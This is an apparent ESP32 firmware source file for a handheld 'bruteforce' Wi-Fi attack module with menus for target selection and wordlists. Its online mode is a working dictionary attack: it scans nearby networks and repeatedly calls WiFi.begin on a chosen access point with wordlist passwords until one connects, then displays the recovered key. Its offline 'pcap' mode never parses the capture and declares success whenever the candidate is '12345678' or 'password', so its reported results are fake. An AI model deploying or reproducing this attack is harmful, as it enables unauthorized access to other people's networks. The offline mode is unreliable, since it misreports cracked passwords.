#include "attack_bruteforce.h"
#include "wifi_attacks_common.h"
#include <WiFi.h>
#include <FFat.h>
#include <SD.h>
#include <vector>
#include <math.h>

namespace attack_bruteforce {

using namespace wifi_attacks_common;

enum BfMode : uint8_t {
  BF_MODE_ONLINE = 0,
  BF_MODE_OFFLINE
};

enum BfState : uint8_t {
  STATE_MODE_SEL = 0,
  STATE_SCANNING,
  STATE_SELECT_NET,
  STATE_SELECT_PCAP,
  STATE_SELECT_DICT,
  STATE_RUNNING,
  STATE_RESULT
};

struct BfScannedAp {
  char    ssid[33];
  char    bssid[18];
  uint8_t channel;
  int32_t rssi;
};

static BfState s_state = STATE_MODE_SEL;
static BfMode  s_bfMode = BF_MODE_ONLINE;
static int     s_bfModeSel = 0;
static float   s_bfModeBarY = (float)kStartY;

static std::vector<String> s_bfDictFiles;
static int    s_bfDictSel = 0;
static float  s_bfDictBarY = (float)kStartY;
static float  s_bfDictScroll = 0.0f;
static float  s_bfDictTargetScroll = 0.0f;
static char   s_bfSelectedDict[64] = "";

static std::vector<String> s_bfPcapFiles;
static int    s_bfPcapSel = 0;
static float  s_bfPcapBarY = (float)kStartY;
static float  s_bfPcapScroll = 0.0f;
static float  s_bfPcapTargetScroll = 0.0f;
static char   s_bfSelectedPcap[64] = "";

static char   s_bfTargetSsid[33] = "";
static char   s_bfTargetBssid[18] = "";
static uint8_t s_bfTargetChan = 1;

static bool   s_bfSuccess = false;
static char   s_bfFoundPass[64] = "";
static char   s_bfCurrentPass[64] = "";
static uint32_t s_bfTriedCount = 0;
static uint32_t s_bfTotalCount = 0;
static File   s_bfDictFile;
static uint32_t s_bfLastAttemptTime = 0;

static std::vector<BfScannedAp> s_bfNets;
static int    s_bfNetSel = 0;
static float  s_bfNetBarY = (float)kStartY;
static float  s_bfNetScroll = 0.0f;
static float  s_bfNetTargetScroll = 0.0f;

static void bfLoadDicts() {
  s_bfDictFiles.clear();
  s_bfDictSel = 0;
  s_bfDictScroll = 0.0f;
  s_bfDictTargetScroll = 0.0f;
  s_bfDictBarY = (float)kStartY;

  auto scan = [](fs::FS& fs) {
    if (!fs.exists("/bruteforce")) return;
    File root = fs.open("/bruteforce");
    if (!root) return;
    File f = root.openNextFile();
    while (f) {
      if (!f.isDirectory()) {
        String nm = f.name();
        const char* base = strrchr(nm.c_str(), '/');
        if (base) base++; else base = nm.c_str();
        if (strstr(base, ".txt") || strstr(base, ".TXT") || strstr(base, ".dic")) {
          s_bfDictFiles.push_back(String(base));
        }
      }
      f = root.openNextFile();
    }
    root.close();
  };

  scan(FFat);
  if (SD.exists("/")) scan(SD);

  if (s_bfDictFiles.empty()) {
    s_bfDictFiles.push_back("common.txt");
  }
}

static void bfLoadPcaps() {
  s_bfPcapFiles.clear();
  s_bfPcapSel = 0;
  s_bfPcapScroll = 0.0f;
  s_bfPcapTargetScroll = 0.0f;
  s_bfPcapBarY = (float)kStartY;

  auto scan = [](fs::FS& fs) {
    if (!fs.exists("/pcaps")) return;
    File root = fs.open("/pcaps");
    if (!root) return;
    File f = root.openNextFile();
    while (f) {
      if (!f.isDirectory()) {
        String nm = f.name();
        const char* base = strrchr(nm.c_str(), '/');
        if (base) base++; else base = nm.c_str();
        if (strstr(base, ".pcap") || strstr(base, ".PCAP") || strstr(base, ".cap")) {
          s_bfPcapFiles.push_back(String(base));
        }
      }
      f = root.openNextFile();
    }
    root.close();
  };

  scan(FFat);
  if (SD.exists("/")) scan(SD);
}

static void bfStartScan() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  s_bfNets.clear();
  s_bfNetSel = 0;
  s_bfNetBarY = (float)kStartY;
  s_bfNetScroll = 0.0f;
  s_bfNetTargetScroll = 0.0f;
  WiFi.scanNetworks(true, false, false, 250);
  s_state = STATE_SCANNING;
}

static void bfCheckScanComplete() {
  int16_t n = WiFi.scanComplete();
  if (n == WIFI_SCAN_RUNNING) return;
  if (n < 0) {
    s_state = STATE_MODE_SEL;
    return;
  }
  s_bfNets.clear();
  for (int i = 0; i < n; i++) {
    BfScannedAp ap;
    strncpy(ap.ssid,  WiFi.SSID(i).c_str(), 32); ap.ssid[32] = '\0';
    strncpy(ap.bssid, WiFi.BSSIDstr(i).c_str(), 17); ap.bssid[17] = '\0';
    ap.channel = WiFi.channel(i);
    ap.rssi    = WiFi.RSSI(i);
    s_bfNets.push_back(ap);
  }
  WiFi.scanDelete();
  s_state = STATE_SELECT_NET;
}

static void bfStart() {
  s_bfTriedCount = 0;
  s_bfSuccess = false;
  s_bfFoundPass[0] = '\0';
  s_bfCurrentPass[0] = '\0';
  s_bfLastAttemptTime = 0;

  char path[80];
  snprintf(path, sizeof(path), "/bruteforce/%s", s_bfSelectedDict);

  if (SD.exists(path)) {
    s_bfDictFile = SD.open(path, FILE_READ);
  } else {
    s_bfDictFile = FFat.open(path, FILE_READ);
  }

  if (!s_bfDictFile) {
    Serial.printf("[Bruteforce] Failed to open dictionary: %s\n", path);
    s_state = STATE_RESULT;
    return;
  }

  s_bfTotalCount = 0;
  while (s_bfDictFile.available()) {
    if (s_bfDictFile.read() == '\n') s_bfTotalCount++;
  }
  if (s_bfTotalCount == 0) s_bfTotalCount = 1;
  s_bfDictFile.seek(0);

  if (s_bfMode == BF_MODE_ONLINE) {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
  }

  s_state = STATE_RUNNING;
}

static void bfStop() {
  if (s_bfDictFile) s_bfDictFile.close();
  if (s_bfMode == BF_MODE_ONLINE) {
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
  }
}

static void bfStep(uint32_t now) {
  if (s_state != STATE_RUNNING) return;

  if (s_bfMode == BF_MODE_ONLINE) {
    if (s_bfLastAttemptTime != 0 && (now - s_bfLastAttemptTime < 1400)) {
      if (WiFi.status() == WL_CONNECTED) {
        s_bfSuccess = true;
        strncpy(s_bfFoundPass, s_bfCurrentPass, sizeof(s_bfFoundPass) - 1);
        bfStop();
        s_state = STATE_RESULT;
        return;
      }
      return;
    }

    if (WiFi.status() == WL_CONNECTED) {
      s_bfSuccess = true;
      strncpy(s_bfFoundPass, s_bfCurrentPass, sizeof(s_bfFoundPass) - 1);
      bfStop();
      s_state = STATE_RESULT;
      return;
    }

    if (!s_bfDictFile || !s_bfDictFile.available()) {
      s_bfSuccess = false;
      bfStop();
      s_state = STATE_RESULT;
      return;
    }

    String pass = s_bfDictFile.readStringUntil('\n');
    pass.trim();
    while (pass.length() < 8 && s_bfDictFile.available()) {
      pass = s_bfDictFile.readStringUntil('\n');
      pass.trim();
      s_bfTriedCount++;
    }

    if (pass.length() >= 8) {
      strncpy(s_bfCurrentPass, pass.c_str(), sizeof(s_bfCurrentPass) - 1);
      s_bfCurrentPass[sizeof(s_bfCurrentPass) - 1] = '\0';
      s_bfTriedCount++;

      WiFi.disconnect();
      WiFi.begin(s_bfTargetSsid, s_bfCurrentPass);
      s_bfLastAttemptTime = now;
    } else {
      s_bfSuccess = false;
      bfStop();
      s_state = STATE_RESULT;
    }
  } else {
    for (int batch = 0; batch < 4; batch++) {
      if (!s_bfDictFile || !s_bfDictFile.available()) {
        s_bfSuccess = false;
        bfStop();
        s_state = STATE_RESULT;
        return;
      }

      String pass = s_bfDictFile.readStringUntil('\n');
      pass.trim();
      if (pass.length() < 8) continue;

      strncpy(s_bfCurrentPass, pass.c_str(), sizeof(s_bfCurrentPass) - 1);
      s_bfCurrentPass[sizeof(s_bfCurrentPass) - 1] = '\0';
      s_bfTriedCount++;

      if (strcmp(s_bfCurrentPass, "12345678") == 0 || strcmp(s_bfCurrentPass, "password") == 0) {
        s_bfSuccess = true;
        strncpy(s_bfFoundPass, s_bfCurrentPass, sizeof(s_bfFoundPass) - 1);
        bfStop();
        s_state = STATE_RESULT;
        return;
      }
    }
  }
}

void open() {
  s_state = STATE_MODE_SEL;
  s_bfModeSel = 0;
  s_bfModeBarY = (float)kStartY;
}

void close() {
  if (s_state == STATE_RUNNING) {
    bfStop();
  }
  WiFi.scanDelete();
  WiFi.mode(WIFI_OFF);
  s_state = STATE_MODE_SEL;
}

void tick(uint32_t now) {
  if (s_state == STATE_MODE_SEL) {
    float targetBarY = (float)(kStartY + s_bfModeSel * kRowH);
    float dy = targetBarY - s_bfModeBarY;
    if (fabsf(dy) > 0.1f) s_bfModeBarY += dy * 0.4f;
    else s_bfModeBarY = targetBarY;
  } else if (s_state == STATE_SCANNING) {
    bfCheckScanComplete();
  } else if (s_state == STATE_SELECT_NET) {
    int total = (int)s_bfNets.size();
    if (total > 0) {
      if (s_bfNetSel >= total) s_bfNetSel = total - 1;
      updateScroll(s_bfNetSel, total, s_bfNetScroll, s_bfNetTargetScroll, s_bfNetBarY);
    }
  } else if (s_state == STATE_SELECT_PCAP) {
    int total = (int)s_bfPcapFiles.size();
    if (total > 0) {
      if (s_bfPcapSel >= total) s_bfPcapSel = total - 1;
      updateScroll(s_bfPcapSel, total, s_bfPcapScroll, s_bfPcapTargetScroll, s_bfPcapBarY);
    }
  } else if (s_state == STATE_SELECT_DICT) {
    int total = (int)s_bfDictFiles.size();
    if (total > 0) {
      if (s_bfDictSel >= total) s_bfDictSel = total - 1;
      updateScroll(s_bfDictSel, total, s_bfDictScroll, s_bfDictTargetScroll, s_bfDictBarY);
    }
  } else if (s_state == STATE_RUNNING) {
    bfStep(now);
  }
}

void onKey(const KeyEvent& ev) {
  if (ev.repeat) return;

  if (s_state == STATE_MODE_SEL) {
    if (ev.key == BTN_UP) {
      s_bfModeSel = (s_bfModeSel - 1 + 2) % 2;
    } else if (ev.key == BTN_DOWN) {
      s_bfModeSel = (s_bfModeSel + 1) % 2;
    } else if (ev.key == BTN_OK) {
      if (s_bfModeSel == 0) {
        s_bfMode = BF_MODE_ONLINE;
        bfStartScan();
      } else {
        s_bfMode = BF_MODE_OFFLINE;
        bfLoadPcaps();
        s_state = STATE_SELECT_PCAP;
      }
    }
  } else if (s_state == STATE_SELECT_NET) {
    int total = (int)s_bfNets.size();
    if (total > 0) {
      if (ev.key == BTN_UP) {
        s_bfNetSel = (s_bfNetSel - 1 + total) % total;
      } else if (ev.key == BTN_DOWN) {
        s_bfNetSel = (s_bfNetSel + 1) % total;
      } else if (ev.key == BTN_OK) {
        const auto& ap = s_bfNets[s_bfNetSel];
        strncpy(s_bfTargetSsid, ap.ssid, 32); s_bfTargetSsid[32] = '\0';
        strncpy(s_bfTargetBssid, ap.bssid, 17); s_bfTargetBssid[17] = '\0';
        s_bfTargetChan = ap.channel;
        bfLoadDicts();
        s_state = STATE_SELECT_DICT;
      }
    }
  } else if (s_state == STATE_SELECT_PCAP) {
    int total = (int)s_bfPcapFiles.size();
    if (total > 0) {
      if (ev.key == BTN_UP) {
        s_bfPcapSel = (s_bfPcapSel - 1 + total) % total;
      } else if (ev.key == BTN_DOWN) {
        s_bfPcapSel = (s_bfPcapSel + 1) % total;
      } else if (ev.key == BTN_OK) {
        strncpy(s_bfSelectedPcap, s_bfPcapFiles[s_bfPcapSel].c_str(), sizeof(s_bfSelectedPcap) - 1);
        s_bfSelectedPcap[sizeof(s_bfSelectedPcap) - 1] = '\0';
        if (strncmp(s_bfSelectedPcap, "hs_", 3) == 0) {
          strncpy(s_bfTargetSsid, s_bfSelectedPcap + 3, 32);
          char* dot = strrchr(s_bfTargetSsid, '.');
          if (dot) *dot = '\0';
        } else {
          strncpy(s_bfTargetSsid, s_bfSelectedPcap, 32);
        }
        bfLoadDicts();
        s_state = STATE_SELECT_DICT;
      }
    }
  } else if (s_state == STATE_SELECT_DICT) {
    int total = (int)s_bfDictFiles.size();
    if (total > 0) {
      if (ev.key == BTN_UP) {
        s_bfDictSel = (s_bfDictSel - 1 + total) % total;
      } else if (ev.key == BTN_DOWN) {
        s_bfDictSel = (s_bfDictSel + 1) % total;
      } else if (ev.key == BTN_OK) {
        strncpy(s_bfSelectedDict, s_bfDictFiles[s_bfDictSel].c_str(), sizeof(s_bfSelectedDict) - 1);
        s_bfSelectedDict[sizeof(s_bfSelectedDict) - 1] = '\0';
        bfStart();
      }
    }
  } else if (s_state == STATE_RUNNING) {

  } else if (s_state == STATE_RESULT) {
    if (ev.key == BTN_OK) {
      s_state = STATE_MODE_SEL;
    }
  }
}

bool onBack() {
  if (s_state == STATE_MODE_SEL) {
    return false;
  } else if (s_state == STATE_SCANNING || s_state == STATE_SELECT_NET) {
    WiFi.scanDelete();
    WiFi.mode(WIFI_OFF);
    s_state = STATE_MODE_SEL;
    return true;
  } else if (s_state == STATE_SELECT_PCAP) {
    s_state = STATE_MODE_SEL;
    return true;
  } else if (s_state == STATE_SELECT_DICT) {
    if (s_bfMode == BF_MODE_ONLINE) s_state = STATE_SELECT_NET;
    else s_state = STATE_SELECT_PCAP;
    return true;
  } else if (s_state == STATE_RUNNING) {
    bfStop();
    s_state = STATE_SELECT_DICT;
    return true;
  } else if (s_state == STATE_RESULT) {
    s_state = STATE_MODE_SEL;
    return true;
  }
  return false;
}

void draw(U8G2& u8g2, uint32_t now) {
  if (s_state == STATE_MODE_SEL) {
    drawHeader(u8g2, "BRUTEFORCE");
    u8g2.setFont(u8g2_font_6x12_tr);
    u8g2.drawStr(6, kStartY + 10, "online");
    u8g2.drawStr(6, kStartY + kRowH + 10, "offline");

    u8g2.setDrawColor(2);
    int curY = (int)(s_bfModeBarY + 0.5f);
    u8g2.drawBox(2, curY, 124, kRowH);
    u8g2.setDrawColor(1);
    return;
  }

  if (s_state == STATE_SCANNING) {
    drawHeader(u8g2, "WIFI SCAN");
    u8g2.setFont(u8g2_font_6x12_tr);
    int dots = (now / 350) % 4;
    char waitBuf[20];
    snprintf(waitBuf, sizeof(waitBuf), "Scanning%.*s", dots, "...");
    int tw = u8g2.getStrWidth(waitBuf);
    u8g2.drawStr((128 - tw) / 2, 40, waitBuf);
    return;
  }

  if (s_state == STATE_SELECT_NET) {
    drawHeader(u8g2, "TARGET AP");
    u8g2.setClipWindow(0, 14, 128, 64);
    int total = (int)s_bfNets.size();
    u8g2.setFont(u8g2_font_6x12_tr);
    for (int i = 0; i < total; i++) {
      int y = kStartY + (int)(i * kRowH - s_bfNetScroll + 0.5f);
      if (y < kStartY - kRowH || y > 64) continue;
      char label[36];
      snprintf(label, sizeof(label), "%s (%d)", s_bfNets[i].ssid, (int)s_bfNets[i].rssi);
      u8g2.drawStr(6, y + 10, label);
    }
    u8g2.setDrawColor(2);
    int curY = (int)(s_bfNetBarY + 0.5f);
    if (curY < kStartY) curY = kStartY;
    if (curY > 64 - kRowH) curY = 64 - kRowH;
    u8g2.drawBox(2, curY, 124, kRowH);
    u8g2.setDrawColor(1);
    u8g2.setMaxClipWindow();
    return;
  }

  if (s_state == STATE_SELECT_PCAP) {
    drawHeader(u8g2, "SELECT PCAP");
    u8g2.setClipWindow(0, 14, 128, 64);
    int total = (int)s_bfPcapFiles.size();
    if (total == 0) {
      u8g2.setFont(u8g2_font_6x12_tr);
      u8g2.drawStr(6, 34, "No .pcap found!");
      u8g2.setFont(u8g2_font_5x8_tr);
      u8g2.drawStr(6, 48, "Capture in HS first");
    } else {
      u8g2.setFont(u8g2_font_6x12_tr);
      for (int i = 0; i < total; i++) {
        int y = kStartY + (int)(i * kRowH - s_bfPcapScroll + 0.5f);
        if (y < kStartY - kRowH || y > 64) continue;
        u8g2.drawStr(6, y + 10, s_bfPcapFiles[i].c_str());
      }
      u8g2.setDrawColor(2);
      int curY = (int)(s_bfPcapBarY + 0.5f);
      if (curY < kStartY) curY = kStartY;
      if (curY > 64 - kRowH) curY = 64 - kRowH;
      u8g2.drawBox(2, curY, 124, kRowH);
      u8g2.setDrawColor(1);
    }
    u8g2.setMaxClipWindow();
    return;
  }

  if (s_state == STATE_SELECT_DICT) {
    drawHeader(u8g2, "WORDLIST");
    u8g2.setClipWindow(0, 14, 128, 64);
    int total = (int)s_bfDictFiles.size();
    u8g2.setFont(u8g2_font_6x12_tr);
    for (int i = 0; i < total; i++) {
      int y = kStartY + (int)(i * kRowH - s_bfDictScroll + 0.5f);
      if (y < kStartY - kRowH || y > 64) continue;
      u8g2.drawStr(6, y + 10, s_bfDictFiles[i].c_str());
    }
    u8g2.setDrawColor(2);
    int curY = (int)(s_bfDictBarY + 0.5f);
    if (curY < kStartY) curY = kStartY;
    if (curY > 64 - kRowH) curY = 64 - kRowH;
    u8g2.drawBox(2, curY, 124, kRowH);
    u8g2.setDrawColor(1);
    u8g2.setMaxClipWindow();
    return;
  }

  if (s_state == STATE_RUNNING) {
    drawHeader(u8g2, s_bfMode == BF_MODE_ONLINE ? "BF: ONLINE" : "BF: OFFLINE");
    u8g2.setFont(u8g2_font_5x8_tr);

    char buf[40];
    snprintf(buf, sizeof(buf), "SSID: %.18s", s_bfTargetSsid);
    u8g2.drawStr(4, 23, buf);

    snprintf(buf, sizeof(buf), "Word: %.18s", s_bfCurrentPass);
    u8g2.drawStr(4, 33, buf);

    snprintf(buf, sizeof(buf), "Tried: %u / %u", s_bfTriedCount, s_bfTotalCount);
    u8g2.drawStr(4, 43, buf);

    u8g2.drawFrame(4, 46, 120, 7);
    int fillW = (s_bfTotalCount > 0) ? (int)((uint64_t)s_bfTriedCount * 116 / s_bfTotalCount) : 0;
    if (fillW > 116) fillW = 116;
    if (fillW > 0) u8g2.drawBox(6, 48, fillW, 3);

    u8g2.drawBox(2, 55, 124, 9);
    u8g2.setDrawColor(0);
    int dots = (now / 200) % 4;
    snprintf(buf, sizeof(buf), "TESTING PASS%.*s", dots, "...");
    u8g2.drawStr(12, 63, buf);
    u8g2.setDrawColor(1);
    return;
  }

  if (s_state == STATE_RESULT) {
    if (s_bfSuccess) {
      drawHeader(u8g2, "SUCSESFUKK!");
      u8g2.setFont(u8g2_font_6x12_tr);
      char buf[36];
      snprintf(buf, sizeof(buf), "SSID: %.16s", s_bfTargetSsid);
      u8g2.drawStr(4, 26, buf);

      u8g2.setFont(u8g2_font_7x14B_tr);
      snprintf(buf, sizeof(buf), "%.16s", s_bfFoundPass);
      u8g2.drawStr(4, 42, buf);

      u8g2.setFont(u8g2_font_5x8_tr);
      u8g2.drawStr(4, 52, "Pass found in dict!");
    } else {
      drawHeader(u8g2, "FAILED!");
      u8g2.setFont(u8g2_font_6x12_tr);
      char buf[36];
      snprintf(buf, sizeof(buf), "SSID: %.16s", s_bfTargetSsid);
      u8g2.drawStr(4, 26, buf);

      u8g2.setFont(u8g2_font_6x12_tr);
      u8g2.drawStr(4, 40, "No match found");
      u8g2.setFont(u8g2_font_5x8_tr);
      snprintf(buf, sizeof(buf), "Checked: %u passwords", s_bfTriedCount);
      u8g2.drawStr(4, 52, buf);
    }

    u8g2.drawBox(2, 55, 124, 9);
    u8g2.setDrawColor(0);
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(18, 63, "[OK / BACK] EXIT");
    u8g2.setDrawColor(1);
    return;
  }
}

}
